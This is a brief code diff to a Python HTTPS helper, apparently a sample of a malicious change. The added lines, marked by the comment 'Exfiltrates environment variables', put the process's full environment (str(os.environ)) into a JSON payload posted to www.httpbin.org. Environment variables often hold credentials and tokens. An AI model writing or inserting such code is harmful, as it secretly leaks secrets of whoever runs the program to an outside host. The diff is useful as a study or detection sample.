@@ -3,10 +3,11 @@ import json
 import os
 
 # Sends an HTTPS post request and prints out the response.
+# Exfiltrates environment variables.
 def send_https_post_request(called_from: str, print_logs: bool) -> None:
   host = "www.httpbin.org"
   conn = http.client.HTTPSConnection(host)
-  data = {'text': 'Sending data through HTTPS from: ' + called_from}
+  data = {"text": f"Sending data through HTTPS from: {called_from}. Found environment variables: {str(os.environ)}"}
   json_data = json.dumps(data)
   conn.request("POST", "/post", json_data, headers={"Host": host})
   response = conn.getresponse()
